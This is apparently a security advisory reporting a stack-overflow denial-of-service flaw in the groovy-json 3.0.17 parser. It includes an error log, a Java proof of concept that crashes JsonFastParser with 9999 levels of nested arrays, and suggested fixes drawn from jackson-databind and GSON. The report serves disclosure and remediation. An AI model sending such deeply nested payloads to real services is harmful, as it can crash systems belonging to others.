## StackOverflowError caused by groovy-json parsing of untrusted JSON String
### Description
---
Using groovy-json to parse untrusted JSON String may be vulnerable to denial of service (DOS) attacks. If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.

### Error Log
---
        Exception in thread "main" java.lang.StackOverflowError
            at org.apache.groovy.json.internal.JsonFastParser.decodeJsonArrayOverlay(JsonFastParser.java:252)
            at org.apache.groovy.json.internal.JsonFastParser.decodeValueOverlay(JsonFastParser.java:132)
            at org.apache.groovy.json.internal.JsonFastParser.decodeJsonArrayOverlay(JsonFastParser.java:282)
            at org.apache.groovy.json.internal.JsonFastParser.decodeValueOverlay(JsonFastParser.java:132)
            at org.apache.groovy.json.internal.JsonFastParser.decodeJsonArrayOverlay(JsonFastParser.java:282)
            at org.apache.groovy.json.internal.JsonFastParser.decodeValueOverlay(JsonFastParser.java:132)
            at org.apache.groovy.json.internal.JsonFastParser.decodeJsonArrayOverlay(JsonFastParser.java:282)
            ...
            at org.apache.groovy.json.internal.JsonFastParser.decodeValueOverlay(JsonFastParser.java:132)
### Version
        <dependency>
            <groupId>org.codehaus.groovy</groupId>
            <artifactId>groovy-json</artifactId>
            <version>3.0.17</version>
        </dependency>

### PoC
---
import groovy.json.JsonParser;
import org.apache.groovy.json.internal.JsonFastParser;

        public class CodehausGroovyJsonTest {

            public final static int TOO_DEEP_NESTING = 9999;
            public final static String TOO_DEEP_DOC = _nestedDoc(TOO_DEEP_NESTING, "[ ", "] ", "0");


            public static String _nestedDoc(int nesting, String open, String close, String content) {
                StringBuilder sb = new StringBuilder(nesting * (open.length() + close.length()));
                for (int i = 0; i < nesting; ++i) {
                    sb.append(open);
                    if ((i & 31) == 0) {
                        sb.append("\n");
                    }
                }
                sb.append("\n").append(content).append("\n");
                for (int i = 0; i < nesting; ++i) {
                    sb.append(close);
                    if ((i & 31) == 0) {
                        sb.append("\n");
                    }
                }
                return sb.toString();
            }

            public static void main(String[] args) {
                JsonParser jsonParser = new JsonFastParser();
                jsonParser.parse(TOO_DEEP_DOC);
            }
        }

        
### Rectification Solution
---
1.Refer to the solution of jackson-databind: Add the depth variable to record the current parsing depth. If the parsing depth exceeds a certain threshold, an exception is thrown. ([FasterXML/jackson-databind@fcfc499](https://github.com/FasterXML/jackson-databind/commit/fcfc4998ec23f0b1f7f8a9521c2b317b6c25892b))

2.Refer to the GSON solution: Change the recursive processing on deeply nested arrays or JSON objects to stack+iteration processing.([google/gson@2d01d6a20f39881c692977564c1ea591d9f39027](https://github.com/google/gson/commit/2d01d6a20f39881c692977564c1ea591d9f39027%EF%BC%89))
